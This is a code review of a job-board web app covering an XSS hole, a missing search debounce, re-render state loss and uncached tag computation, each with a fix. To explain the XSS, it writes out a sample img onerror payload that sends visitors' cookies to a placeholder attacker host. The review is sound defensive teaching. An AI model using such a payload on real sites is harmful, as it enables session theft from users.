# Code Review — Dev Hiring Board

> Reviewed the MVC structure in `js/model/`, `js/view/`, `js/controller/`, and `js/services/`. Findings are ranked by severity.

---

## Finding 1 — XSS via `innerHTML` with job description and API fields

**Severity: CRITICAL**
**Files:** `js/view/JobView.js:16-23`, `js/view/JobView.js:37`

### What is XSS?

XSS stands for **Cross-Site Scripting**. It happens when a string from an external source (an API response, a form, a URL) gets written into the page as raw HTML instead of as plain text. The browser doesn't know the difference between "HTML the developer wrote" and "HTML that happened to arrive in a variable" — if it's assigned to `innerHTML`, it gets parsed and any `<script>`, `<img onerror>`, or event-handler attribute inside it runs.

This app fetches job postings from `https://remoteok.com/api`. Every job's `position`, `company`, `location`, and especially `description` field is content **submitted by employers**, not written by this app. A real check of that live endpoint shows `description` is itself a raw HTML blob returned by the API, e.g.:

```
"<p>Assure Scratch &amp; Dent are seeking an experienced Vehicle Repair Assessor...</p><ul><li>...</li></ul>"
```

That's already HTML markup, not plain text — and it is assigned straight into `innerHTML` with no sanitization. Any employer (or anyone able to influence the feed) could post a job with a description like:

```html
<img
  src="x"
  onerror="fetch('https://evil.site/steal?cookie=' + document.cookie)"
/>
```

Since `description.innerHTML = job.description` renders whatever comes back verbatim, that image tag would be created, its `onerror` handler would fire immediately (the `src` is invalid), and the attacker's JavaScript would execute in every visitor's browser the moment they expand that job card.

### ❌ Wrong (current code)

```js
// js/view/JobView.js
function _createJobCard(job, savedJobs = [], appliedJobs = [], handlers = {}) {
  const card = document.createElement("div");
  card.className = "job-card";

  const salary =
    job.salary_min && job.salary_max
      ? `$${job.salary_min} - $${job.salary_max}`
      : "Salary not specified";

  card.innerHTML = `
    <h2>${job.position}</h2>
    <p><strong>${job.company}</strong></p>
    <p>${job.location || "Remote"}</p>
    <p>${salary}</p>
    <div class="tags"></div>
    <button class="details-btn">View Details</button>
  `;

  // ...

  // Job description (collapsed by default)
  const description = document.createElement("div");
  description.className = "description hidden";
  description.innerHTML = job.description;
  card.appendChild(description);
```

### ✅ Correct fix

Build the card's text nodes with `createElement`/`textContent`, and sanitize `job.description` before it's ever treated as HTML (or render it as plain text too, if rich formatting isn't required):

```js
// js/view/JobView.js
function _createJobCard(job, savedJobs = [], appliedJobs = [], handlers = {}) {
  const card = document.createElement("div");
  card.className = "job-card";

  const salary =
    job.salary_min && job.salary_max
      ? `$${job.salary_min} - $${job.salary_max}`
      : "Salary not specified";

  const title = document.createElement("h2");
  title.textContent = job.position;

  const company = document.createElement("p");
  const companyStrong = document.createElement("strong");
  companyStrong.textContent = job.company;
  company.appendChild(companyStrong);

  const location = document.createElement("p");
  location.textContent = job.location || "Remote";

  const salaryEl = document.createElement("p");
  salaryEl.textContent = salary;

  const tagsContainer = document.createElement("div");
  tagsContainer.className = "tags";

  const detailsBtn = document.createElement("button");
  detailsBtn.className = "details-btn";
  detailsBtn.textContent = "View Details";

  card.append(title, company, location, salaryEl, tagsContainer, detailsBtn);

  // ...

  // Job description (collapsed by default) — strip markup, render as text
  const description = document.createElement("div");
  description.className = "description hidden";
  description.textContent = stripHtml(job.description || "");
  card.appendChild(description);
```

**Why this works:** `textContent` never parses its input as markup — `<img onerror=...>` is displayed as the literal characters `<img onerror=...>`, not executed. The `stripHtml` helper already exists in `js/services/utils.js` (currently only used for search matching); reusing it here for rendering means the description text shows without any embedded tags or event handlers surviving.

---

## Finding 2 — No debounce on the search input; full re-render on every keystroke

**Severity: HIGH**
**File:** `js/controller/AppController.js:17-19`

### What's the problem?

The `input` event fires on **every keystroke**. In `_setupEventListeners`, each keystroke calls `_handleSearchChange`, which calls `_render()` synchronously:

```js
searchInput.addEventListener("input", (e) => {
  _handleSearchChange(e.target.value);
});
```

`_render()` doesn't just recompute a filtered array — it calls `JobView.renderJobs(...)`, which does `jobList.innerHTML = ""` and rebuilds **every job card from scratch**, and `FilterView.renderTagFilters(...)`, which does the same for the entire tag-checkbox list. Typing an 8-character search term like "engineer" wipes and rebuilds the whole job list and filter panel 8 times in a fraction of a second.

This has a visible, concrete side effect in this app: `_createJobCard` tracks each card's expanded/collapsed description state via a `hidden` class on a DOM node created fresh each render. If a user expands a job's description and then types in the search box (even to refine, not clear, their search), the entire card — including that expanded state — is destroyed and recreated collapsed on the very next keystroke.

### ❌ Wrong (current code)

```js
// js/controller/AppController.js
searchInput.addEventListener("input", (e) => {
  _handleSearchChange(e.target.value);
});
```

### ✅ Correct fix

```js
// js/controller/AppController.js
//write generic debounce

const _debouncedSearchChange = _debounce(_handleSearchChange, 300);

searchInput.addEventListener("input", (e) => {
  _debouncedSearchChange(e.target.value);
});
```

**Why this works:** every keystroke cancels the previous pending timer and starts a new 300ms countdown. The list only re-renders once the user pauses typing, instead of on every character — cutting DOM churn dramatically and avoiding the mid-typing state reset described above.

---

## Finding 3 — Job cards re-render from scratch, silently discarding a user's expanded description on any state change

**Severity: MEDIUM**
**Files:** `js/view/JobView.js:79-97`, `js/controller/AppController.js:55-71`

### What's the problem?

`_render()` in `AppController.js` is called after search, tag filter, tab change, save, _and_ apply — and every one of those calls `JobView.renderJobs`, which does `jobList.innerHTML = ""` then rebuilds every card via `_createJobCard`. The expand/collapse state added by the "View Details" button lives only in the DOM (`description.classList.toggle("hidden")` in `_createJobCard`) and is never part of the model.

Concretely: a user opens a job's description, then clicks **Save** on a _different_ job card. `_handleSaveJob` calls `JobModel.toggleSavedJob(jobId)` then `_render()`, which rebuilds the entire job list — collapsing the description the user had open, with no indication why. The same happens for Apply, tag-filter changes, and tab switches.

### What to do

Either track expanded-card IDs in the model/view state and restore them after re-render, or (simpler) re-render only the specific card whose data changed instead of the whole list on save/apply actions.

---

## Finding 4 — `getUniqueTags` recomputed from the full job list on every render

**Severity: LOW**
**File:** `js/model/JobModel.js:78-80`

### What's the problem?

```js
getTagOptions() {
  return getUniqueTags(_jobModelState.jobs);
},
```

`_render()` calls `JobModel.getTagOptions()` on every search keystroke, tag change, tab change, save, and apply. `getUniqueTags` iterates every job and every job's tag array and rebuilds a `Set` each time, even though the underlying job list (`_jobModelState.jobs`) only changes once, at `init()`. It's not expensive at ~100 jobs, but it's recomputing a value that's invariant across nearly all of the events that trigger it.

### What to do

Compute the tag list once in `setJobs()` and cache it, invalidating only when `setJobs` is called again:

```js
setJobs(jobs) {
  _jobModelState.jobs = jobs;
  _jobModelState.tagOptions = getUniqueTags(jobs);
},

getTagOptions() {
  return _jobModelState.tagOptions;
},
```

---

## MVC Violations Summary

Beyond the issues above, the project's MVC separation has a few structural concerns:

| Issue                                                                                                                                                                                                                         | Where                                                                     | Fix                                                                                                                                       |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `JobModel.getState()` returns the live internal state object by reference, not a copy                                                                                                                                         | `js/model/JobModel.js:74-76`                                              | Return a shallow copy (or specific derived fields) so callers can't mutate `_jobModelState` directly, e.g. `return { ..._jobModelState }` |
| `JobView` reaches past its own render call to strip HTML for search matching — `stripHtml` lives in `services/utils.js` but is never used by the view even though the view is the one injecting raw `job.description` as HTML | `js/view/JobView.js:37`, `js/services/utils.js:25-29`                     | Reuse `stripHtml` in the view (see Finding 1) instead of only using it for search filtering                                               |
| No error UI path — `JobService.fetchJobs()` shows a browser `alert()` on failure, and `AppController.init()` only logs to `console.error` with no user-facing fallback in the DOM                                             | `js/services/JobService.js:12-15`, `js/controller/AppController.js:83-85` | Add a `JobView.renderError(message)` so failures surface in the page, not just an `alert()`/console log                                   |

---

## Quick reference — safe vs unsafe

| Method                                 | Treats string as                                       | Safe for external data?                                                |
| -------------------------------------- | ------------------------------------------------------ | ---------------------------------------------------------------------- |
| `element.innerHTML = str`              | HTML — parses and executes tags                        | No                                                                     |
| `element.textContent = str`            | Plain text — displays literally                        | Yes                                                                    |
| `element.setAttribute("src", url)`     | Attribute value                                        | Yes                                                                    |
| `img.src = url`                        | Property — same as setAttribute                        | Yes                                                                    |
| `document.createElement(tag)`          | Creates a real DOM node                                | Yes                                                                    |
| `stripHtml(html)` (this repo's helper) | Strips tags via a detached element, returns plain text | Yes, once returned — use it before rendering untrusted HTML as content |
